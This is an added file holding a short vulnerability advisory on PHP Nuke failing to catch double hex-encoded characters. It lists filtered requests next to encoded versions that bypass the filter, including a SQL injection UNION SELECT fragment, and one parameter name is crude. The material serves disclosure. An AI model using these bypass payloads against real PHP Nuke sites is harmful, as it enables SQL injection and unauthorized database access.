@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/13557/info
+
+PHP Nuke is prone to an input validation vulnerability. Reports indicate the script fails to correctly identify potentially dangerous characters when the characters are double hex-encoded (i.e. %25%41 == %41 == A).
+
+A remote attacker may exploit this issue to bypass PHP Nuke protections and exploit issues that exist in the underlying PHP Nuke installation. 
+
+Will be filtered:
+'modules.php?FistFucker=()'
+
+Will be bypassed:
+'modules.php?FistFucker=%2528%2529'
+
+
+Will be filtered:
+'/**/UNION/**/SELECT/**/'
+
+Will be bypassed:
+'/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/' 
